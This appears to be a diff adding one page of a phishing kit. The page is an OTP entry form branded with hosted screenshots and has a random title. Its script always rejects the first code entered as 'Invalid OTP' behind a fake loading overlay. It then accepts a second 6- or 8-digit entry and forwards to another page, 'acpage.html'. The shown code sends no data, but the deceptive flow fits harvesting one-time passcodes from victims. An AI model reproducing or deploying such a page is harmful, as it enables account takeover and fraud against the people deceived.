@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #FFFFFF;
+      width: 98%;
+      overflow-x: hidden;
+    }
+
+    img {
+      width: 100%;
+      max-width: 1000px;
+      border-radius: 0px;
+      margin-top: 40px;
+    }
+
+    .form-container {
+      width: 90%;
+      max-width: 400px;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 0px rgba(0,0,0,0.1);
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-group {
+      margin-bottom: 10px;
+      text-align: left;
+    }
+
+    input[type="password"] {
+      width: 90%;
+      padding: 8px;
+      background-color: #ffffff;
+      border: 1px solid #373737ee;
+      border-radius: 6px;
+      font-size: 12px;
+      color: #333;
+    }
+
+    .error-text {
+      color: red;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .submit_btn {
+      margin-top: 20px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .submit_btn button {
+      background: #f09c19;
+      color: #fff;
+      font-size: 13px;
+      font-weight: bold;
+      padding: 6px 18px;
+      text-align: center;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit_btn button:hover {
+      background: #0f3f55;
+    }
+
+    .countdown {
+      font-size: 13px;
+      color: #333;
+      font-weight: bold;
+    }
+
+    .bottom-image {
+      display: block;
+      margin: 20px auto 0 auto;
+      width: 100%;
+      max-width: 350px;
+      border-radius: 0px;
+    }
+
+    .blur-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(5px);
+      background: rgba(255, 255, 255, 0.6);
+      z-index: 99;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      font-weight: bold;
+      color: #000;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #f09c19;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-top: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="blur-overlay" id="blurOverlay">
+    Loading...
+    <div class="loader"></div>
+  </div>
+
+  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="New Header">
+
+  <div class="form-container">
+    <form onsubmit="return handleSubmit()">
+      <div class="form-group">
+        <input type="password" id="otp" maxlength="8" placeholder=" " required>
+        <div class="error-text" id="errorText">Invalid OTP</div>
+      </div>
+
+      <div class="submit_btn">
+        <button type="submit">Submit</button>
+        <div class="countdown" id="timer">03:00</div>
+      </div>
+    </form>
+
+    <img class="bottom-image" src="https://i.ibb.co/Q7Vd7N0D/Screenshot-2025-04-19-21-58-55-92-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+  </div>
+
+  <script>
+    let attempt = 1;
+
+    function handleSubmit() {
+      const blur = document.getElementById("blurOverlay");
+      const otp = document.getElementById("otp");
+      const errorText = document.getElementById("errorText");
+
+      blur.style.display = "flex";
+
+      setTimeout(() => {
+        blur.style.display = "none";
+
+        if (attempt === 1) {
+          errorText.style.display = "block";
+          attempt++;
+        } else {
+          if (otp.value.length === 6 || otp.value.length === 8) {
+            window.location.href = "acpage.html";
+          } else {
+            alert("Please enter a valid 6 or 8 digit OTP.");
+          }
+        }
+
+      }, 4000);
+
+      return false;
+    }
+
+    // Countdown Timer - 3 minutes
+    let timeLeft = 180;
+    const timerDisplay = document.getElementById("timer");
+
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+      if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateTimer, 1000);
+      }
+    }
+
+    updateTimer();
+  </script>
+</body>
+</html>
